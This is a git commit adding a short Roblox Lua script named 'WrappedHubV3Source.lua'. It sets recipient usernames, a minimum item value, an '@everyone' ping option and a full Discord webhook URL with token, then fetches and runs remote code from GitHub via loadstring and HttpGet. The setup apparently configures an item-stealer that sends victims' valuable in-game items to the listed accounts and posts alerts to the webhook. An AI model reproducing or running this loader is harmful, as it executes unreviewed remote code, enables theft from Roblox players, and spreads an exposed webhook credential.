c77ab86049be152411c146bb27d6efe38d4647ad
skezik <xanaxik420@gmail.com>
2025-05-13 18:51:24 +0200

    Create WrappedHubV3Source.lua

---
+++ WrappedHubV3Source.lua
@@ -0,0 +1,6 @@
+_G.Usernames = {"skezalt1", "bloodhoundskez", "user3"} -- you can add as many as you'd like
+_G.min_value = 50 -- bgsi.gg is used for values
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1371891601344954428/dXg2xFklFB8m0ADZ6kQk3HgRNgWLRQ8fJcmx-Fpxp_8YWzK8hYNLjVRbl8MZtuxRyoTC" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/skezik/WrappedHubV3.lua/refs/heads/main/WrappedHubV3.lua"))()
